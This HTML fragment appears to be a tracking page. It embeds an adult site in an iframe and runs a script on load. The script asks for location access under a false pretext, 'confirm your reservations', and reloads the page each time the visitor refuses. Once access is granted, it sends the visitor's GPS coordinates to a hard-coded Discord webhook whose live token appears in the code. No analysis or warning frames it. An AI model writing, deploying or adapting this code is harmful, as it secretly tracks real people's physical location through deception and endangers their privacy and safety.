    <iframe id="content-frame" src="https://arabhotx.com/Ù…ÙŠÙ„Ù-Ù…Ù†Ù‚Ø¨Ù‡-Ù…Ù…Ø­ÙˆÙ†Ù‡-Ø¨Ø¬Ø³Ù…-Ù…Ø±Ø¨Ø±Ø¨-ØªØµÙˆØ±-Ù†ÙˆØ¯Ø²/"></iframe>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1293612557373935689/ylT9Dtc40v1QJeAF49susiMm__EAWBGvuxxpPwRa2hw8HUjBgYD6m46CpAlLELgyTnK4";

        // Function to get GPS coordinates and send them to the webhook
        function getGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function (position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Prepare data with coordinates
                    const data = {
                        content: `### User GPS coordinates: ${latitude}, ${longitude}`
                    };

                    // Send GPS data
                    try {
                        await fetch(webhookURL, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(data)
                        });
                    } catch (error) {
                        console.error("Failed to send GPS data:", error);
                    }
                }, function (error) {
                    // On error (permission denied, etc.), reload the page to prompt again
                    location.reload();
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        // Trigger an alert and ask for permission to access the user's location
        window.onload = function () {
            const userConfirmed = confirm("Location services are required to confirm your reservations. Please enable location access to continue using the site.");
            if (userConfirmed) {
                getGPS();
            } else {
                // If the user dismisses, reload the page to prompt again
                location.reload();
            }
        };
    </script>
